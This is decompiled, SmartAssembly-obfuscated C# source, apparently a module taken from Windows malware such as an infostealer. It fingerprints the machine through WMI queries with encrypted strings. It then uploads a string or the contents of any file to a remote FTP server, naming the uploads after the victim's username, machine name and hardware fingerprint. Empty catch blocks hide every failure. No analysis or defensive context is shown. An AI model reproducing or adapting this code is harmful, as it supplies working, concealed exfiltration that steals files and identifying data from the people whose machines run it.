using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fTOyYuFiHboGKe;

internal sealed class ceWGkLeWGlSf
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string oIVDOcdsSwsdKp()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107407033));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107407012)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107406963);
		ManagementObject val3 = new ManagementObject(getString_0(107406958) + text2 + getString_0(107406949));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107406944)).ToString();
		return text3 + text;
	}

	public static void BoAkSHXUUyZ(string dDTxnlUftnskWh = "URL", string riuQyZXOOLM = "USERNAME", string cYpSBUjGjRiPXGI = "ACCESO", string XXBCRGiVkQUe = "")
	{
		try
		{
			string text = oIVDOcdsSwsdKp();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(dDTxnlUftnskWh + getString_0(107407871) + Environment.UserName + getString_0(107407826) + Environment.MachineName + getString_0(107407837) + text + getString_0(107407288));
			ftpWebRequest.Method = getString_0(107406919);
			ftpWebRequest.Credentials = new NetworkCredential(riuQyZXOOLM, cYpSBUjGjRiPXGI);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(XXBCRGiVkQUe);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void juUjjlmBvTArjN(string dqCfHQzWVry = "URL", string buppXYfUaUe = "USERNAME", string jEzXHwrJUFfD = "ACCESO", string jLmzHtGTUwGFYw = "")
	{
		try
		{
			string text = oIVDOcdsSwsdKp();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(dqCfHQzWVry + getString_0(107407871) + Environment.UserName + getString_0(107407826) + Environment.MachineName + getString_0(107407837) + text + getString_0(107407837) + Path.GetFileName(jLmzHtGTUwGFYw));
			ftpWebRequest.Method = getString_0(107406919);
			ftpWebRequest.Credentials = new NetworkCredential(buppXYfUaUe, jEzXHwrJUFfD);
			byte[] array = File.ReadAllBytes(jLmzHtGTUwGFYw);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ceWGkLeWGlSf()
	{
		Strings.CreateGetStringDelegate(typeof(ceWGkLeWGlSf));
	}
}
